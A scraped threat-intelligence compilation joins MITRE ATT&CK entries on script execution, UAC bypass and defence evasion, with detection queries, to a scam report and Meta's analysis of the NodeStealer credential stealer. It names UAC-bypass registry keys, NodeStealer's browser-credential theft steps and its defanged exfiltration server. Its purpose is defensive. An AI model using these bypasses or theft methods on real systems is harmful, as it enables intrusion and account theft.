interpreter for Windows.[40] SpeakUp uses Perl scripts.[41] Stealth Falcon malware uses WMI to script data collection and command execution on the victim.[42] Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.[43] Windigo has used a Perl script for information gathering.[10] WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.[44] Zeus Panda can launch remote scripts on the victimâs machine.[45]  Anti-virus can be used to automatically quarantine suspicious files.  On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic and JavaScript scripts from executing potentially malicious downloaded content [46]. Where possible, only permit execution of signed scripts. Disable or remove any unnecessary or unused shells or interpreters. Use application control where appropriate. For example, PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., Add-Type).[47] When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[48] PowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.[49] Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place. Monitor command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used.  Monitor for events associated with scripting execution, such as the loading of modules associated with scripting languages (ex: JScript.dll or vbscript.dll). Monitor log files for process execution through command-line and scripting activities. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages. Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner, or other information that may reveal abuse of system features. For example, consider monitoring for Windows Event ID (EID) 400, which shows the version of PowerShell executing in the EngineVersion field (which may also be relevant to detecting a potential Downgrade Attack) as well as if PowerShell is running locally or remotely in the HostName field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.[50] Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1059/001,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.[1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.[2] PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).[3][4][5] During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[6] AADInternals is written and executed via PowerShell.[7] AppleSeed has the ability to execute its payload via PowerShell.[8] APT19 used PowerShell commands to execute payloads.[9] APT28 downloads and executes PowerShell scripts and performs PowerShell commands.[10][11][12] APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.[13][14][15][16] APT3 has used PowerShell on victim systems to download and run payloads after exploitation.[17] APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.[18][19][20] APT33 has utilized PowerShell to download files from the C2 server and run various scripts.

Set PowerShell execution policy to execute only signed scripts. It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution. Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., Add-Type).[251] When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[252] PowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.[253] If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity. It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). [254] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[255] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data. Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).[3][4] suspicious_processes = filter ProcessGuid, ProcessFilePath, ModulePath, FileDescription where  EventId == ""7""  AND  (ModulePath LIKE '%system.management.automation%' OR   FileDescription LIKE '%system.management.automation%') Monitor for newly executed processes that may abuse PowerShell commands and scripts for execution. processes = filter process where ((event_id=""10"" OR event_id=""4688"") AND exe == ""powershell.exe"" AND parent_exe != ""explorer.exe"") processes = filter process where ((event_id=""10"" OR event_id=""4688"") AND exe == ""wsmprovhost.exe"" and parent_exe == ""svchost.exe"") Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the EngineVersion field (which may also be relevant to detecting a potential Downgrade Attack) as well as if PowerShell is running locally or remotely in the HostName field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.[256] Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1059/003,"Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.[1] Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1548,"Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system. Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[1] System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk. Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions. Remove users from the local administrator group on systems. By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed. The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking. Monitor executed commands and arguments that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Monitor the file system for files that have the setuid or setgid bits set. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file. Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Also look for any process API calls for behavior that may be indicative of Process Injection. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling. Monitor for newly executed processes that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions.  suspicious_processes = filter processes where (  (parent_image_path == C:\Windows\System32\services.exe"" AND   image_path == ""C:\Windows\System32\cmd.exe"" AND   command_line == ""echo"" AND   command_line == ""\pipe*"") OR  (image_path == ""C:\Windows\System32\rundll32.exe"" AND   command_line == "",a /p:*""))  Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1548/002,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[1] If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.[2][3] An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4] Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5] that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as: Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.[8] AppleJeus has presented the user with a UAC prompt to elevate privileges while installing.[9] APT29 has bypassed UAC.[10] APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.[11] AutoIt backdoor attempts to escalate privileges by bypassing User Access Control.[12] Avaddon bypasses UAC using the CMSTPLUA COM interface.[13]  Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges.[14] BitPaymer can suppress UAC prompts by setting the HKCU\Software\Classes\ms-settings\shell\open\command registry key on Windows 10 or HKCU\Software\Classes\mscfile\shell\open\command on Windows 7 and launching the eventvwr.msc process, which launches BitPaymer with elevated privileges.[15] BlackCat can bypass UAC to escalate privileges.[16]  BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.[17] BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.[18][19] Bumblebee has the ability to bypass UAC to deploy post exploitation tools with elevated privileges.[20] Clambling has the ability to bypass UAC using a passuac.dll file.[21][22] Cobalt Group has bypassed UAC.[23] Cobalt Strike can use a number of known techniques to bypass Windows UAC.[24][25] CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.[26] Downdelph bypasses UAC to escalate privileges by using a custom ""RedirectEXE"" shim database.[27] Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges.[28] Empire includes various modules to attempt to bypass UAC for escalation of privileges.[29] Evilnum has used PowerShell to bypass UAC.[30] FinFisher performs UAC bypass.[31][32] Gelsemium can bypass UAC to elevate process privileges on a compromised host.[33] Grandoreiro can bypass UAC by registering as the default handler for .MSC files.[34] H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).[35] InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges.[36][37] Koadic has 2 methods for elevating integrity.

Consider updating Windows to the latest version and patch level to utilize the latest protective measures against UAC bypass.[5] Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking. Monitor executed commands and arguments that may bypass UAC mechanisms to elevate process privileges on system. Monitor newly executed processes, such as eventvwr.exe and sdclt.exe, that may bypass UAC mechanisms to elevate process privileges on system. Threat actors often, after compromising a machine, try to disable User Access Control (UAC) to escalate privileges. This is often done by changing the registry key for system policies using ""reg.exe"", a legitimate tool provided by Microsoft for modifying the registry via command prompt or scripts. This action interferes with UAC and may enable a threat actor to escalate privileges on the compromised system, thereby allowing further exploitation of the system. possible_uac_bypass = filter processes where (  integrity_level == ""High"" and  (parent_image_path == ""c:\windows\system32\fodhelper.exe"") or  (command_line == "".exe\""cleanmgr.exe /autoclean"") or  (image_path == ""c:\program files\windows media player\osk.exe"") or  (parent_image_path == ""c:\windows\system32\slui.exe"") or  (parent_command_line == '""c:\windows\system32\dism.exe"""""".xml""' and image_path != ""c:\users*\appdata\local\temp*\dismhost.exe"") or  (command_line == '""c:\windows\system32\wusa.exe""/quiet*' and user != ""NOT_TRANSLATED"" and current_working_directory == ""c:\windows\system32\"" and parent_image_path != ""c:\windows\explorer.exe"") or  (parent_image_path == ""c:\windows*dccw.exe"" and image_path != ""c:\windows\system32\cttune.exe""))  cmd_processes = filter processes where (                (parent_image = ""C:\Windows\System32\cmd.exe"") AND (command_line = ""reg.exe%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System%REG_DWORD /d 0%""))  Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may bypass UAC mechanisms to elevate process privileges on system. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:* The eventvwr.exe bypass uses the [HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command Registry key.[6]* The sdclt.exe bypass uses the [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe and [HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand Registry keys.[66][67]Analysts should monitor these Registry settings for unauthorized changes.

Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.[1][2][3] Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.[4] Bundlore uses the mktemp utility to make unique file and directory names for payloads, such as TMP_DIR=`mktemp -d -t x.[5] DarkTortilla has used %HiddenReg% and %HiddenKey% as part of its persistence via the Windows registry.[6] OSX/Shlayer has used the mktemp utility to make random and unique filenames for payloads, such as export tmpDir=""$(mktemp -d /tmp/XXXXXXXXXXXX)"" or mktemp -t Installer.[7][5][8] Tarrask is able to create ""hidden"" scheduled tasks by deleting the Security Descriptor (SD) registry value.[9] WarzoneRAT can masquerade the Process Environment Block on a compromised host to hide it's attempts to elevate privileges through IFileOperation.[10]

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1218,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.[1] Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands. Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands.[2][3] Lazarus Group lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL.[4][5] Many native binaries may not be necessary within a given environment. Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network. Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using using trusted binaries to bypass application control. Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage. Monitor executed commands and arguments that may forge credential materials that can be used to gain access to web applications or Internet services. Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.

Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion.

This is common behavior that can be used across different platforms and the network to evade defenses.  Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [1] Adversaries may also use compressed or archived scripts, such as JavaScript.  Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. [2] Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1112,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution. Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. [1] Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API. Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. [2] Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. [3] [4] The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.

For example, HTTPS over port 8088[1] or port 587[2] as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.

 Online criminals are notorious for lurking on social media sites and tricking users into visiting malicious links. We recently observed a scheme where Facebook users are clicking on posts that lead to external websites set up for the sole purpose of scamming them out of hundreds of dollars via fake browser alerts. What is unique with this campaign is the abuse of Google Cloud Run to generate new malicious links every few minutes. We've previously never seen tech support scams hosted on Google's serverless platform, and certainly not at this scale. In this blog, we expose the techniques used by scammers to lure victims while evading detection. We have reported these incidents to both Facebook and Google. Facebook relies on users sharing content by posting photos, videos or links to various stories. However, when a link is posted for an external website, Facebook can no longer control the user experience, and in particular any risk that may occur from visiting it. We identified several Facebook accounts that were posting a number of stories, ranging from clickbait articles to newsworthy content. We're unsure whether those accounts were compromised or not, but we noticed that the same account posted more than one malicious link but at different time intervals, indicating that it might have been controlled by a threat actor.  In the next section, we take a look at how these websites are set up in a way to deceive security controls by employing a technique known as cloaking. If you were to visit the URLs while running a VPN or perhaps via a country that is not targeted, you will see what appears to be a typical news site devoid of any scam. But the closer you look at those sites, the more you realize they are bogus: They're essentially the same content with different domain names. This is the same old cloaking technique where a fraudster creates a decoy page to deceive online platforms and security tools.  Now, if you happen to click on a Facebook post as a real human (not a bot or using a VPN), you will get something entirely different, as the cloaking domains will perform a 302 redirect. This is a simple server-side instruction that will load another website immediately and seamlessly. In the diagram below, we can see the network traffic and details for each web request, eventually loading a page that we are all too familiar with: a fake Microsoft alert.   One thing that drew our attention immediately was that the fake error pages are hosted on Google Cloud Run, a ""managed computer platform that lets you run containers directly on top of Google's scalable infrastructure"". Essentially, developers only need to create a container and deploy it as a micro service, without the need for a server, allowing them to focus on the code instead. For a scammer, this is simply another platform they can abuse with minimum overhead costs. In fact, Google offers new customers $300 in free credits to spend on Cloud Run and two million requests free per month, not charged against credits. We monitored the cloaking domains closely for some time and determined that the threat actor has set up a scheduled task that creates a new Cloud Run URL every 5 minutes. This new URL is immediately available and assigned to the cloaking domain for the malicious redirect. Over the course of a few days, we observed thousands of malicious URLs:  Not only does the URL keep on changing, but the IP addresses they are using are also shared with other customers. This means that any security product relying on a domain or IP blocklist will be unable to keep up with this campaign. Social media can be a great source of entertainment or a way to connect with family and friends. However, there are inherent risks to using these platforms and caution should be exercized. Clickbait articles are notorious for leading to various bogus offers or worse. Another issue is how promoted posts can quickly become viral as victims inadvertently share links with their contacts. Certainly, tech support scammers are well aware of how to target certain demographics, such as seniors, and lure them in via deceiving Facebook posts. As always, we recommend not to panic even if your computer screen suddenly becomes hijacked as a stern audio recording plays back. In practically all cases, you can safely close these pop-ups and be back up and running quickly. Malwarebytes Browser Guard is able to protect against these attacks flawlessly, no matter how many times the fraudsters swap Google Cloud Run URLs. The built-in fraud heuristic engine is able to detect the malicious code and block it in real time.   Cloaking domains Cloaking hosting Google Cloud Run URLs (partial list here).

Malwarebytes Threat Intelligence - July 2023 3,https://engineering.fb.com/2023/05/03/security/malware-nodestealer-ducktail/,"Today, weâre sharing our latest work to detect and disrupt malware campaigns targeting business users across the internet.Â  We know that malicious groups behind malware campaigns are extremely persistent, and we fully expect them to keep trying to come up with new tactics and tooling in an effort to survive disruptions by any one platform where they spread. Thatâs why our security teams tackle malware â one of the most persistent threats online â as part of our defense-in-depth approach through multiple efforts at once. It includes: malware analysis and targeted threat disruption, continuously improving detection systems to block malware at scale, security product updates, community support and education, threat information sharing with other companies and holding threat actors accountable in court. This helps raise the cost for these malicious groups and limits the lifecycle of any single strain of malware â forcing threat actors to continue to invest time and resources into constantly adapting to stay afloat With much malware weâve seen and countered over the years being hosted outside of social media, including our services, we encourage people to be cautious when downloading new software like browser extensions or mobile apps, or downloading files across the internet. For more security tips, visit our Newsroom. Before we dive into the technical analysis of one of the new malware families we recently detected â NodeStealer, weâre sharing the latest trends weâve seen across this threat landscape more broadly to help inform our collective defenses across the internet. While many malware campaigns use off-the-shelf tooling available powered by a booming marketplace, the focus of our analysis today is on malware families that are custom-built to target business users on particular internet services. Here is what stood out to us in our threat research into these tailored operations and their tooling.Â  With more security teams across our industry publicly reporting and sharing threat indicators into various malware operations, weâve seen operators invest in a number of tactics to enable persistence and adapt to enforcements.Â  Many of them try to spread across many internet services, including social media, ad platforms, file-sharing and file-hosting services, link shorteners, and even niche websites for creators and their fans. This is likely an attempt to ensure that a complex, multi-pronged malware campaign can withstand takedowns by any one of these services because they each only have limited visibility into the entire malicious operation.Â  A long-running malware family known in the security community as Ducktail is a good example. For several years, weâve tracked and blocked iterations of Ducktail originating from Vietnam that have evolved as a result of enforcements by Meta and our industry peers. Ducktail is known to target a number of platforms across the internet, including: In addition, many malware families are very astute to the detection of their actions which constantly forces them to adjust in hopes of buying a short advantage window over the defender community.Â  As an example, in its latest iteration, Ducktail operators, likely in response to our round-the-clock detection terminating stolen sessions, began automatically granting business admin permissions to requests for ad-related actions sent by attackers as an attempt to speed up their operations before we block them. However, our continued detection and mitigations provide protections to businesses against these latest adaptations. In addition, as we learn from these investigations, we keep innovating product security approaches. Today, weâre sharing a number of new product features making business accounts more resilient to these attacks. Finally, we also issued a cease and desist letter to individuals behind it in Vietnam, referred to law enforcement, and will consider all appropriate additional enforcement options against malicious actors behind targeting people on our services. Our research and that of security researchers has shown time and again that malware operators, just like spammers, try to latch onto hot-button issues and popular topics to get peopleâs attention. With an ultimate goal to trick people into clicking on malicious links or downloading malicious software, the latest wave of malware campaigns have taken notice of generative AI tools becoming popular.Â Â  Over the past several months, weâve investigated and taken action against malware strains taking advantage of peopleâs interest in OpenAIâs ChatGPT to trick them into installing malware pretending to provide AI functionality.Â  These latest attempts, just like Ducktail, targeted a number of platforms across the internet, including file-sharing services Dropbox, Google Drive, Mega, MediaFire, Discord, Atlassianâs Trello, Microsoft OneDrive, and iCloud to host this malware. Its ultimate goal is to compromise businesses with access to ad accounts across the internet. Since March 2023 alone, we have found around ten malware families using ChatGPT and other similar themes to compromise accounts across the internet. In one case, weâve seen threat actors create malicious browser extensions available in official web stores that claim to offer ChatGPT-based tools. They would then promote these malicious extensions on social media and through sponsored search results to trick people into downloading malware. In fact, some of these extensions did include working ChatGPT functionality alongside malware, likely to avoid suspicion from official web stores. Weâve blocked over 1,000 unique ChatGPT-themed malicious URLs from being shared on our platforms and shared them to our industry peers so they, too, can take action, as appropriate.Â  Similar to Ducktail, weâve seen blocking and public reporting of these malicious strains force their operators to rapidly evolve tactics to try and stay afloat. Weâve seen them use cloaking in an attempt to circumvent automated ad review systems, and leverage popular marketing tools like link-shorteners to disguise the ultimate destination of these links. Many of them also changed their lures to other popular themes like Googleâs Bard and TikTok marketing support. Some of these campaigns, after we blocked malicious links to file-sharing and site hosting platforms, began targeting smaller services, such as Buy Me a Coffee â a service used by creators to accept support from their audiences â to host and deliver malware. Our industry continues to detect and disrupt custom-built novel malware that targets business for advertising fraud. By tailoring these operations to be used for attempted business account compromise on a particular service â like Facebook or Google or others â threat actors are able to focus their tooling to use more sophisticated forms of account compromise, like capturing session tokens in an attempt to circumvent two factor authentication requirements. They can also include functionality that can automatically detect connections between the compromised user and business accounts they might be connected to.Â  A novel malware strain we named NodeStealer that we recently uncovered and disrupted early in its operation is a good example of this trend. Weâre sharing a deep dive into how this particular custom-built malware operates, including our malware analysis.Â  â In late January 2023, our security team identified a new malware NodeStealer that targeted internet browsers on Windows with a goal of stealing cookies and saved usernames and passwords to ultimately compromise Facebook, Gmail, and Outlook accounts. NodeStealer is custom-written in JavaScript and bundles the Node.js environment. We assessed the malware to be of Vietnamese origin and distributed by threat actors from Vietnam.Â  We identified NodeStealer early â within two weeks of it being deployed â and took action to disrupt it and help people who may have been targeted to recover their accounts. As part of this effort, we submitted takedown requests to third-party registrars, hosting providers, and application services such as Namecheap, which were targeted by these threat actors to facilitate distribution and malicious operations. These actions led to a successful disruption of the malware. We have not observed any new samples of malware in the NodeStealer family since February 27 of this year and continue monitoring for any potential future activity. We are sharing threat indicators and information about how this malware works to enable further security research by our industry to help us all strengthen our collective defense. NodeStealer samples are typically disguised as PDF and XLSX files with an appropriate corresponding icon and a filename meant to trick people into opening malicious files. This tactic makes it difficult for people to see that they are opening a potentially malicious executable instead of an innocuous document: Hereâs an example of a NodeStealer file. At the time of discovery, this file only had one detection on VirusTotal. It is likely because the file is almost entirely comprised of the Node.js environment and contains novel malicious code. While the file is a Windows executable file (with an .exe extension), it is disguised as a PDF file with a PDF icon. We also observed metadata on the file that attempts to disguise the file as a product of âMicrosoftOffice:â Diving a bit more into the file structure, we found that this malware is written in Javascript, executed using Node.js, and is compiled into a Windows executable with a tool from the Node Package Manager (NPM) called pkg. This particular sample is around 46 MB in size, however we have seen files ranging from 46-51 MB. The file is large because it bundles the entire Node.js environment and all third-party package dependencies. For context, Node.js is a cross-platform, open-source Javascript runtime environment, which provides various Javascript libraries and is often used to develop web applications. Pkg is a command-line tool that packages node.js code into an executable file for various platforms including Linux, macOS, and Windows. When executed, the malware first establishes persistence to ensure that it continues to operate after the victim restarts the machine. The malware uses the auto-launch module on Node.js to do so* In this example, there is a new registry key added under âHKCU\Software\Microsoft\Windows\CurrentVersion\Run\<current file name>â to execute the malware upon startup. The ultimate goal of this malware is to steal stored password and cookie session information from Chromium-based browsers on the targetâs computer. The malware targets Chrome, Opera, Microsoft Edge and Brave browsers. For each of them, the malware will: First, reference the file paths to files that store sensitive user information such as cookies and credentials (username/password) for various sites:  The malware then decrypts the sensitive data from the browser data stores. Since the browser encrypts the userâs information before storing it, the malware performs the following steps to decrypt the user data: It will read the encrypted_key from the âLocal Stateâ file, Base64 decode it, and retrieve the decryption key by using the win32crypt Node.js library: After retrieving the decryption key, the malware reads data from the âCookiesâ file, which is an SQLite database containing cookie values. The malware looks for a Facebook session cookie and will only continue if one is found. If no Facebook session cookie is found, the malware does not extract more information: If a Facebook session cookie is found, the malware starts reading data from the âLogin Dataâ file, which is an SQLite database containing saved usernames and passwords. The malware specifically targets user credentials for Facebook, Gmail, and Outlook. We hypothesize that the malware steals email credentials to compromise the userâs contact point and potentially to access other online accounts connected to that email account: With the decryption key now extracted, the malware decrypts the encrypted data read from the âLogin Dataâ file using AES decryption. After retrieving the Facebook credentials from the targetâs browser data, the malware uses it to make several unauthorized requests to Facebook URLs to enumerate account information related to advertising. The malware gains access to this information by making requests from the targeted userâs computer to the APIs used by our Facebook web and mobile apps, which masquerades its activity behind the userâs actual IP address, cookie values, and system configuration â appearing like a legitimate user and their session. This makes detection of this activity significantly more difficult. The stolen information then enables the threat actor to assess and then use usersâ advertising accounts to run unauthorized ads.Â  After retrieving the stored browser information and performing the Facebook account reconnaissance, the malware exfiltrates all stolen data to the threat actorâs command-and-control (C2) server hosted at: hxxps://bot2q.advertiser-noreplysupport[.]dev. This C2 server URL is hard-coded into the malware. The malware aggregates the stolen data in a JSON object which is then Base64 encoded. In an attempt to evade detection, the malware makes a GET request to: hxxps://bot2q.advertiser-noreplysupport[.]dev/avatar.png, with the Base64 data placed in the âAuthorizationâ HTTP header: Based on publicly available information, the malware C2 domain was registered with Namecheap on December 27th, 2022. At the time of this analysis, the domain name resolved to the OVH VPS IP 15[.]235[.]187[.]170. We also observed a published DNS mail exchange (MX) record on that domain using Namecheapâs âPrivate Emailâ service. The C2 server appears to be a Node.js âExpressâ-based web application hosted by Nginx, judging by the serverâs response header values. We reported this domain to Namecheap and it is no longer resolving (as of January 25th, 2023).Â  These indicators are available in machine readable formats on our Malware Detection repository on GitHub. *Please note that we have reformatted some of the source code contained in this blog in order to make it easier to read and understand.

